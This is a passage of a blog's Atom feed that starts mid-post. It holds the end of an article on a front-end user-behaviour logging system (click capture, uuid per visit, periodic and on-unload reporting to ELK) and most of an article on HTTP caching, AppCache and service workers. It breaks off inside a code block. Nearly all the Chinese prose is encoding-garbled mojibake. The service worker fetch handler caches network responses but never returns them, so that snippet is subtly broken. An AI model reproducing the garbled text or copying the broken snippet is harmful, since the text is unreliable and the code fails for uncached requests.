&amp;&amp; ev.targetTouches[<span class="number">0</span>].clientX)),</span><br><span class="line">    y: <span class="built_in">Math</span>.round(ev.clientY || ev.pageY || (ev.targetTouches &amp;&amp; ev.targetTouches[<span class="number">0</span>].clientY)),</span><br><span class="line">    type: ev.type,</span><br><span class="line">    createTime: DateFormat(<span class="keyword">new</span> <span class="built_in">Date</span>(), <span class="string">'yyyy-mm-dd hh:ii:ss'</span>),</span><br><span class="line">    location: location.pathname + location.search + location.hash</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="æ•°æ®åŒºåˆ†"><a href="#æ•°æ®åŒºåˆ†" class="headerlink" title="æ•°æ®åŒºåˆ†"></a>æ•°æ®åŒºåˆ†</h4><p>æ•°æ®æ”¶é›†ä¸Šå»äº†ï¼Œè¿˜è¦åŒºåˆ†æ˜¯å“ªä¸ªç”¨æˆ·çš„è¡Œä¸ºæˆ–è€…æ˜¯å“ªä¸ªä¸šåŠ¡ä¸ŠæŠ¥çš„ï¼Œæ‰€ä»¥æ¯æ¬¡ä¸ŠæŠ¥éœ€è¦å¸¦ä¸Šç”¨æˆ·çš„ uid å’Œå„ä¸ªä¸šåŠ¡è‡ªå®šä¹‰çš„ keyã€‚</p><p>å¦å¤–ï¼Œå¦‚æœç”¨æˆ·åœ¨è¿™ä¸ªé¡µé¢è·³å‡ºå»åˆè·³å›æ¥äº†ï¼Œä¸¤æ¬¡çš„è¡Œä¸ºæ”¶é›†å°±éœ€è¦åšä¸€ä¸ªåŒºåˆ†ï¼Œæ‰€ä»¥éœ€è¦æ¯æ¬¡è¿›å…¥é¡µé¢æä¾›ä¸€ä¸ª uuidï¼Œåœ¨è¿™æ¬¡é¡µé¢çš„è¡Œä¸ºéƒ½ä¼šå¸¦ä¸Šè¿™ä¸ª uuidï¼Œè·³å‡ºå»åå†æ¬¡è¿›æ¥ï¼Œuuid å°±éœ€è¦ä¸ä¸€æ ·äº†ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * åˆå§‹åŒ–è¡Œä¸ºäº‹ä»¶å‚¨å­˜é˜Ÿåˆ—</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initBehaveLog</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> uuid = getUuid();</span><br><span class="line">    <span class="keyword">var</span> logs = &#123;</span><br><span class="line">        id: uuid,</span><br><span class="line">        stack: []</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸ŠæŠ¥æ—¶æœº"><a href="#ä¸ŠæŠ¥æ—¶æœº" class="headerlink" title="ä¸ŠæŠ¥æ—¶æœº"></a>ä¸ŠæŠ¥æ—¶æœº</h3><ul><li>ç”±äºæˆ‘ä»¬çš„é¡µé¢å¤§éƒ¨åˆ†é‡‡ç”¨ hash è·¯ç”±ï¼Œæ‰€ä»¥ hash æ”¹å˜çš„æ—¶å€™ä¼šä¸ŠæŠ¥ä¸€æ¬¡</li><li>å½“è¡Œä¸ºæ”¶é›†è¾¾åˆ°æŒ‡å®šä¸ªæ•°ï¼Œé‚£ä¹ˆæŠŠå·²æ”¶é›†çš„å…ˆä¸ŠæŠ¥ï¼Œå¹¶æ¸…ç©ºæœ¬åœ°å·²æ”¶é›†æ•°æ®</li><li>æ¯éš”æŒ‡å®šæ—¶é—´å°±ä¸ŠæŠ¥ä¸€æ¬¡ï¼Œå¹¶æ¸…ç©ºæœ¬åœ°å·²æ‰‹æœºæ•°æ®</li><li>åœ¨é¡µé¢è¢«å…³é—­ä¹‹å‰ï¼ŒåŒæ ·ä¸ŠæŠ¥ä¸€æ¬¡</li></ul><p>å¦‚æœä¸ŠæŠ¥æ–¹æ³•å‘ç°ä¸ŠæŠ¥é˜Ÿåˆ—æ²¡æ•°æ®ï¼Œå°±ä¸ä¸ŠæŠ¥ã€‚</p><p>hash æ”¹å˜å’Œé¡µé¢å…³é—­å‰ä¸ŠæŠ¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> REPORT_BEHAVIORS = [<span class="string">'hashchange'</span>, <span class="string">'beforeunload'</span>];</span><br><span class="line"></span><br><span class="line">REPORT_BEHAVIORS.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">behave</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(behave, reportELK);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¾¾åˆ°æŒ‡å®šä¸ªæ•°ä¸ŠæŠ¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (logs.stack.length &gt;= MAX_STORED_LENGTH) &#123;</span><br><span class="line">    reportELK();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¯éš”æŒ‡å®šæ—¶é—´ä¸ŠæŠ¥ä¸€æ¬¡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ¯éš”æŒ‡å®šæ—¶é—´å°±ä¸ŠæŠ¥ä¸€æ¬¡</span></span><br><span class="line">reportTimer = setInterval(reportELK, REPORT_INTERVAL_TIME);</span><br></pre></td></tr></table></figure><h3 id="å¦‚ä½•ä¸ŠæŠ¥"><a href="#å¦‚ä½•ä¸ŠæŠ¥" class="headerlink" title="å¦‚ä½•ä¸ŠæŠ¥"></a>å¦‚ä½•ä¸ŠæŠ¥</h3><p>å‰ç«¯ä¸ŠæŠ¥ä¸€èˆ¬æ˜¯å¼‚æ­¥è¯·æ±‚ï¼Œä½†å…¶å®æˆ‘ä»¬ä¸ç”¨å…³å¿ƒä¸ŠæŠ¥ç»“æœæ˜¯å¦æˆåŠŸï¼Œç”¨å›¾ç‰‡çš„å½¢å¼å‘è¯·æ±‚å²‚ä¸æ˜¯æ›´å¥½ã€‚</p><p>è¿˜æ˜¯æœ‰ä¸ªæ£˜æ‰‹çš„é—®é¢˜ï¼Œåœ¨ç”¨æˆ·å…³é—­é¡µé¢å‰æ€ä¹ˆä¸ŠæŠ¥ï¼Œå¦‚æœæ˜¯å¼‚æ­¥ä¸ŠæŠ¥è‚¯å®šä¸ŠæŠ¥ä¸ä¸Šå»çš„ï¼Œè¿™é‡Œä½¿ç”¨åŒæ­¥è¯·æ±‚å¥½ä¸€ç‚¹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ev &amp;&amp; ev.type &amp;&amp; ev.type.indexOf &amp;&amp; ev.type.indexOf(<span class="string">'unload'</span>) &gt; <span class="number">-1</span> &amp;&amp; XMLHttpRequest) &#123;</span><br><span class="line">    <span class="keyword">var</span> reportMsg = <span class="built_in">encodeURIComponent</span>(<span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">        msg: logs</span><br><span class="line">    &#125;));</span><br><span class="line">    <span class="keyword">var</span> url = <span class="string">'/myReportPath?key='</span> + REPORT_KEY + <span class="string">'&amp;msg='</span> + reportMsg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.open(<span class="string">'POST'</span>, url, <span class="literal">false</span>);   <span class="comment">// false è¡¨æ˜ä½¿ç”¨åŒæ­¥è¯·æ±‚</span></span><br><span class="line">    xhr.send();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ•°æ®è½åœ°å’ŒæŸ¥è¯¢"><a href="#æ•°æ®è½åœ°å’ŒæŸ¥è¯¢" class="headerlink" title="æ•°æ®è½åœ°å’ŒæŸ¥è¯¢"></a>æ•°æ®è½åœ°å’ŒæŸ¥è¯¢</h3><h4 id="æ•°æ®è½åœ°"><a href="#æ•°æ®è½åœ°" class="headerlink" title="æ•°æ®è½åœ°"></a>æ•°æ®è½åœ°</h4><p>æˆ‘ä»¬ä½¿ç”¨äº† ELK æ¥å‚¨å­˜æ•°æ®ï¼ŒELK ä¼˜ç‚¹åŒ…æ‹¬æ£€ç´¢æ€§èƒ½é«˜æ•ˆå’Œé›†ç¾¤çº¿æ€§æ‰©å±•ï¼Œé€‚åˆç”¨æ¥å‚¨å­˜å¤§é‡çš„æ•°æ®ã€‚</p><h4 id="æ•°æ®æŸ¥è¯¢"><a href="#æ•°æ®æŸ¥è¯¢" class="headerlink" title="æ•°æ®æŸ¥è¯¢"></a>æ•°æ®æŸ¥è¯¢</h4><p>æ•°æ®æŸ¥è¯¢å¯ä»¥é€šè¿‡ ELK æä¾›çš„æŸ¥è¯¢æ¥å£æ¥æ‹‰å–æ•°æ®ï¼Œæ‹‰å–åˆ°æ•°æ®ä¹‹åè¿˜éœ€è¦å¯¹æ•°æ®åšè¿›ä¸€æ­¥çš„è§£ææ‰èƒ½è½¬ä¸ºå¯è¯»ä¿¡æ¯ï¼Œè¿™é‡Œå¯ä»¥æä¾›ä¸€ä¸ªæŸ¥è¯¢ç³»ç»Ÿä¸“é—¨æ¥æŸ¥è¯¢æ”¶é›†åˆ°çš„è¡Œä¸ºæ•°æ®ï¼Œå¹¶æ”¯æŒä¸‹é¢ç»´åº¦çš„æŸ¥è¯¢ï¼š</p><ul><li>æŒ‰ä¸šåŠ¡æŸ¥è¯¢</li><li>æŒ‰ç”¨æˆ·æŸ¥è¯¢</li><li>å¼€å§‹æ—¶é—´</li><li>ç»“æŸæ—¶é—´</li></ul><h2 id="æœªæ¥è§„åˆ’"><a href="#æœªæ¥è§„åˆ’" class="headerlink" title="æœªæ¥è§„åˆ’"></a>æœªæ¥è§„åˆ’</h2><p>æ—¢ç„¶æˆ‘ä»¬èƒ½æ‹¿åˆ°ç”¨æˆ·çš„æ“ä½œè¡Œä¸ºè·¯å¾„äº†ï¼Œé‚£èƒ½ä¸èƒ½ç›´æ¥å°±æŠŠç”¨æˆ·çš„è¡Œä¸ºå›æ”¾å‡ºæ¥ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨ç”¨æˆ·æ“ä½œçš„é¡µé¢ä¸€æ­¥æ­¥å›æ”¾ç”¨æˆ·æ¯ä¸€æ­¥æ“ä½œäº†ä»€ä¹ˆï¼ŒæŠŠæ•´ä¸ªè·¯å¾„æ’­æ”¾å‡ºæ¥ï¼Œæ˜¯ä¸æ˜¯æ›´ç®€å•æ›´å®¹æ˜“åˆ†æï¼Œå¯ä»¥æœè¿™ä¸ªæ–¹å‘å‘å±•ã€‚</p><h2 id="çœŸå®ä½¿ç”¨æ¡ˆä¾‹"><a href="#çœŸå®ä½¿ç”¨æ¡ˆä¾‹" class="headerlink" title="çœŸå®ä½¿ç”¨æ¡ˆä¾‹"></a>çœŸå®ä½¿ç”¨æ¡ˆä¾‹</h2><p>æ›¾ç»æœ‰ç”¨æˆ·é€šè¿‡æŸäº›ä¸šåŠ¡ä¸Šçš„å·§åˆï¼Œè™½ç„¶ä»–å¹¶ä¸å…·å¤‡èµ”ä»˜çš„æ¡ä»¶ï¼Œä½†æ˜¯è¿™ç§å·§åˆå¯ä»¥è®©ä»–å…·å¤‡æŠ•è¯‰çš„æ¡ä»¶ï¼Œå¦‚æœæ˜¯ä¹‹å‰ï¼Œæˆ‘ä»¬å¾ˆéš¾å»åŒºåˆ†ä»–æ˜¯ä¸æ˜¯å‡æŠ•è¯‰ï¼Œä¹Ÿæ²¡æœ‰è¯æ®æ¥å»éªŒè¯ï¼Œè¯¥ä¸šåŠ¡æ¥ä¸Šè¿™ä¸ªç”¨æˆ·è¡Œä¸ºç³»ç»Ÿåï¼Œæˆ‘ä»¬å¿«é€ŸæŸ¥æ¸…è¿™ä¸ªç”¨æˆ·å…¶å®æ˜¯é€šè¿‡æŸç§å·§åˆæ¥å‡‘æˆæˆ‘ä»¬ç»™ä»–èµ”ä»˜çš„æ¡ä»¶ï¼Œå®é™…ä¸Šä»–çš„å®é™…æ“ä½œå¹¶æ²¡æœ‰é—®é¢˜ï¼Œæˆ‘ä»¬çš„ä¸šåŠ¡ä¹Ÿæ²¡æœ‰bugï¼Œä»…ä»…æ˜¯å·§åˆã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ä»€ä¹ˆæ˜¯ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿ&quot;&gt;&lt;a href=&quot;#ä»€ä¹ˆæ˜¯ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿ&quot; class=&quot;headerlink&quot; title=&quot;ä»€ä¹ˆæ˜¯ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿ&quot;&gt;&lt;/a&gt;ä»€ä¹ˆæ˜¯ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿ&lt;/h2&gt;&lt;p&gt;ç”¨æˆ·è¡Œä¸ºç³»ç»Ÿåº”è¯¥æ˜¯ä¸€ä¸ªå¯ä»¥è¿½æº¯ç”¨æˆ·æ“ä½œè·¯å¾„ã€æä¾›ç”¨æˆ·æ“ä½œåˆ†æå’Œè§£å†³ç”¨æˆ·æŠ•è¯‰çš„ç³»ç»Ÿã€‚å®ƒå¯ä»¥å¸®æˆ‘ä»¬å›æº¯ç”¨æˆ·ä»è¿›æ¥é¡µé¢åï¼Œä»–çš„æ¯ä¸€æ­¥æ“ä½œï¼Œç‚¹å‡»äº†é¡µé¢å“ªä¸ªä½ç½®ï¼Œåšäº†ä½•ç§è¡Œä¸ºï¼Œæ¯”å¦‚æŠ½å¥–ã€ä»˜æ¬¾ã€å……å€¼ç­‰ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="User behave" scheme="http://youngdze.co/tags/User-behave/"/>
    
  </entry>
  
  <entry>
    <title>Service workers</title>
    <link href="http://youngdze.co/2017/08/13/service-worker/"/>
    <id>http://youngdze.co/2017/08/13/service-worker/</id>
    <published>2017-08-13T11:08:41.000Z</published>
    <updated>2017-08-13T11:15:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å¸¸ç”¨-web-é™æ€èµ„æºçš„ç¼“å­˜"><a href="#å¸¸ç”¨-web-é™æ€èµ„æºçš„ç¼“å­˜" class="headerlink" title="å¸¸ç”¨ web é™æ€èµ„æºçš„ç¼“å­˜"></a>å¸¸ç”¨ web é™æ€èµ„æºçš„ç¼“å­˜</h2><ul><li>ä»£ç†æœåŠ¡å™¨ç¼“å­˜</li><li>CDN ç¼“å­˜</li><li>æµè§ˆå™¨ç«¯ç¼“å­˜</li></ul><h3 id="æµè§ˆå™¨ç¼“å­˜"><a href="#æµè§ˆå™¨ç¼“å­˜" class="headerlink" title="æµè§ˆå™¨ç¼“å­˜"></a>æµè§ˆå™¨ç¼“å­˜</h3><ul><li>Cache-Control: max-age=3600(s) | no-cache | no-store</li><li>Pragma: no-cache | Pragma</li><li>Expires: Fri, 11 Aug 2017, 17:00:00 GMT</li><li>Last-Modified: Fri, 11 Aug 2017, 17:00:00 GMT</li><li>If-Modified-Since: Fri, 11 Aug 2017, 17:00:00 GMT</li><li>Etag: â€œv2.6â€</li><li>If-None-Match: â€œv2.6â€</li></ul><p>no-cache æ˜¯å…è®¸ç¼“å­˜çš„ï¼Œä½†æ˜¯ä½¿ç”¨ç¼“å­˜ä¹‹å‰å¿…é¡»å’ŒæœåŠ¡å™¨è¿›è¡Œæ–°é²œåº¦å¯¹æ¯”ï¼Œno-store æ‰æ˜¯ç¦æ­¢ç¼“å­˜ã€‚</p><a id="more"></a><h2 id="AppCache"><a href="#AppCache" class="headerlink" title="AppCache"></a>AppCache</h2><p>å¯¹appå†…å­˜ç¼“å­˜çš„æ–¹æ¡ˆï¼Œå…·ä½“è¡¨ç°ä¸ºå½“è¯·æ±‚æŸä¸ªæ–‡ä»¶æ—¶ä¸æ˜¯ä»ç½‘ç»œè·å–è¯¥æ–‡ä»¶ï¼Œè€Œæ˜¯ä»æœ¬åœ°è·å–ã€‚</p><p>index.appcache</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CACHE MANIFEST</span><br><span class="line">index.html</span><br><span class="line">index.css</span><br><span class="line">index.js</span><br><span class="line">logo.jpg</span><br><span class="line">NETWORK:</span><br><span class="line">*</span><br><span class="line">FALLBACK:</span><br><span class="line">/404.html</span><br></pre></td></tr></table></figure><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">manifest</span>=<span class="string">"index.appcache"</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯ï¼Œæ¯æ¬¡éƒ½ä¼šè¯·æ±‚ index.appcacheï¼Œå¦‚æœè¯·æ±‚çš„æ–‡ä»¶å­˜åœ¨åœ¨ <code>index.appcache</code> é‡Œé¢ï¼Œå°±æ— éœ€å‘æœåŠ¡å™¨è¯·æ±‚ã€‚</p><h3 id="å¼Šç«¯"><a href="#å¼Šç«¯" class="headerlink" title="å¼Šç«¯"></a>å¼Šç«¯</h3><ul><li>é™¤éæ”¹å˜ index.appcacheï¼Œå¦åˆ™ index.appcache é‡Œé¢çš„æ–‡ä»¶æ°¸è¿œåªä¼šæ¥è‡ªåº”ç”¨ç¼“å­˜</li><li>ä¸åœ¨ appcache ç¼“å­˜åˆ—è¡¨é‡Œé¢çš„æ–‡ä»¶ä¸ä¼šè¢«ç¼“å­˜ï¼Œå†æ¬¡è¯·æ±‚ä¹Ÿä¸ä¼šå»è¯·æ±‚ ğŸ˜¶</li></ul><h2 id="Service-workers"><a href="#Service-workers" class="headerlink" title="Service workers"></a>Service workers</h2><p>æœ¬è´¨ä¸Šå……å½“æµè§ˆå™¨å’Œç½‘ç»œä¹‹é—´çš„ä»£ç†æœåŠ¡å™¨ã€‚å®ƒä»¬æ—¨åœ¨èƒ½å¤Ÿåˆ›å»ºæœ‰æ•ˆçš„ç¦»çº¿ä½“éªŒï¼Œæ‹¦æˆªç½‘ç»œè¯·æ±‚å¹¶åŸºäºç½‘ç»œæ˜¯å¦å¯ç”¨åˆ¤æ–­èµ„æºæ˜¯å¦éœ€è¦æ›´æ–°æ¥é‡‡å–é€‚å½“çš„åŠ¨ä½œã€‚ä»–ä»¬è¿˜å…è®¸è®¿é—®æ¨é€é€šçŸ¥å’Œåå°åŒæ­¥APIã€‚</p><p>Service worker è¿è¡Œåœ¨ worker çº¿ç¨‹ï¼Œå’Œé©±åŠ¨åº”ç”¨çš„ JavaScript çº¿ç¨‹æ˜¯åˆ†å¼€çš„ï¼Œä¸¤è€…ç›¸äº’ä¸å—å½±å“ï¼Œæ‰€ä»¥ Service worker æ˜¯ä¸èƒ½è®¿é—® DOM çš„ã€‚</p><p>å®Œå…¨çš„ä½¿ç”¨ Promise å¼‚æ­¥è®¾è®¡ï¼Œä¸å…è®¸ä½¿ç”¨åŒæ­¥ APIã€‚å¿…é¡»åœ¨ HTTPS ä¸‹ä½¿ç”¨ï¼Œä½†æ˜¯è°ƒè¯•çš„æ—¶å€™åœ¨ localhost ä¸‹é¢å¯ä»¥ä½¿ç”¨ HTTPã€‚</p><p>X5 å†…æ ¸æµè§ˆå™¨æ˜¯æ”¯æŒ service worker çš„ã€‚</p><h3 id="Service-workers-ç”Ÿå‘½å‘¨æœŸ"><a href="#Service-workers-ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Service workers ç”Ÿå‘½å‘¨æœŸ"></a>Service workers ç”Ÿå‘½å‘¨æœŸ</h3><p><img src="/images/sw-lifecycle.png" alt=""></p><h3 id="Service-workers-ç›‘å¬äº‹ä»¶"><a href="#Service-workers-ç›‘å¬äº‹ä»¶" class="headerlink" title="Service workers ç›‘å¬äº‹ä»¶"></a>Service workers ç›‘å¬äº‹ä»¶</h3><p><img src="/images/sw-events.png" alt=""></p><h3 id="å…¥å£"><a href="#å…¥å£" class="headerlink" title="å…¥å£"></a>å…¥å£</h3><p>è¿™é‡ŒæŒ‡å®šçš„ <code>sw.js</code> æ˜¯åœ¨ worker çº¿ç¨‹å·¥ä½œï¼Œæ‰€ä»¥å®ƒä¸èƒ½è®¿é—® DOMã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">registerSW</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="string">'serviceWorker'</span> <span class="keyword">in</span> navigator) &#123;</span><br><span class="line">   <span class="comment">// æŒ‡å®š service worker æ‰§è¡Œæ–‡ä»¶å’Œå…¶æ§åˆ¶çš„æ–‡ä»¶çš„å­ç›®å½•</span></span><br><span class="line">    <span class="keyword">return</span> navigator.serviceWorker.register(<span class="string">'/sw.js'</span>, &#123;<span class="attr">scope</span>: <span class="string">'/'</span>&#125;)</span><br><span class="line">      .then(<span class="function"><span class="params">reg</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (reg.installing) &#123;</span><br><span class="line">          log(<span class="string">'Service worker status'</span>, <span class="string">'installing'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (reg.waiting) &#123;</span><br><span class="line">          log(<span class="string">'Service worker status'</span>, <span class="string">'waiting'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (reg.active) &#123;</span><br><span class="line">          log(<span class="string">'Service worker status'</span>, <span class="string">'active'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">`Registration failed with <span class="subst">$&#123;error&#125;</span>`</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// éœ€è¦ç¼“å­˜çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå¯ä»¥é€šè¿‡ Legos ç”Ÿæˆæˆ–è€… Webpack è·å–</span></span><br><span class="line"><span class="keyword">const</span> assets = [</span><br><span class="line">  <span class="string">"/bg-header.24e53c7254a141935d68580e59ac3e2a.jpg"</span>,</span><br><span class="line">  <span class="string">"/i-logo.fe4eaaab959dae955171e85dd6451f01.png"</span>,</span><br><span class="line">  <span class="string">"/sprite-index.155b7aa999c0b00c8b3041e88dab5e3a.png"</span>,</span><br><span class="line">  <span class="string">"/bundle.9eb1d16891f485d70cfd.js"</span>,</span><br><span class="line">  <span class="string">"/style.9eb1d16891f485d70cfd.css"</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç‰ˆæœ¬å·</span></span><br><span class="line"><span class="keyword">const</span> CACHE_NAME = (<span class="keyword">new</span> <span class="built_in">Date</span>()).toISOString();</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰§è¡Œå®‰è£…ï¼Œå°†éœ€è¦ç¼“å­˜çš„æ–‡ä»¶å­˜å…¥ CacheStorage</span></span><br><span class="line">self.addEventListener(<span class="string">'install'</span>, event =&gt; &#123;</span><br><span class="line">  event.waitUntil(</span><br><span class="line">    caches.open(CACHE_NAME)</span><br><span class="line">    .then(<span class="function"><span class="params">cache</span> =&gt;</span> &#123;</span><br><span class="line">      log(<span class="string">'Install'</span>, assets);</span><br><span class="line">      <span class="keyword">return</span> cache.addAll(assets);</span><br><span class="line">    &#125;).then(self.skipWaiting)</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="è¯·æ±‚æ‹¦æˆª"><a href="#è¯·æ±‚æ‹¦æˆª" class="headerlink" title="è¯·æ±‚æ‹¦æˆª"></a>è¯·æ±‚æ‹¦æˆª</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿™é‡Œä¼šç›‘å¬æµè§ˆå™¨çš„ HTTP è¯·æ±‚ï¼Œå¹¶åšä¸€å±‚æ‹¦æˆª</span></span><br><span class="line">self.addEventListener(<span class="string">'fetch'</span>, event =&gt; &#123;</span><br><span class="line">  event.respondWith(</span><br><span class="line">    caches.match(event.request)</span><br><span class="line">    .then(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (response) &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœè¿™ä¸ªè¯·æ±‚å·²ç»ç¼“å­˜è¿‡äº†ï¼Œåˆ™ç›´æ¥ä½¿ç”¨ Cache é‡Œé¢çš„ç¼“å­˜</span></span><br><span class="line">        log(<span class="string">'Use cache'</span>, response.url);</span><br><span class="line">        <span class="keyword">return</span> response;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// å¦‚æœæ²¡æœ‰è¯·æ±‚è¿‡ï¼Œå‰å¾€æœåŠ¡å™¨è¯·æ±‚</span></span><br><span class="line">      <span class="keyword">return</span> fetch(event.request).then(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!response || response.status !== <span class="number">200</span> || response.type !== <span class="string">'basic'</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> response;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        log(<span class="string">'Fetch'</span>, event.request);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// å°†æ–°çš„è¯·æ±‚å›å¤ä¹Ÿç¼“å­˜ä¸‹æ¥</span></span><br><span class="line">        <span class="keyword">let</span> responseToCache = response.clone();</span><br><span class="line">        caches.open(CACHE_NAME)</span><br><span class="line">          .then(<span class="function"><span class="params">cache</span> =&gt;</span> &#123;</span><br><span class="line">            cache.put(event.request, responseToCache);</span><br><span class="line">            log(<span class="string">'Add fetch'</span>, event.request);</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        log(<span class="string">'Fetch failed'</span>, error);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="ç¼“å­˜æ›´æ–°"><a href="#ç¼“å­˜æ›´æ–°" class="headerlink" title="ç¼“å­˜æ›´æ–°"></a>ç¼“å­˜æ›´æ–°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 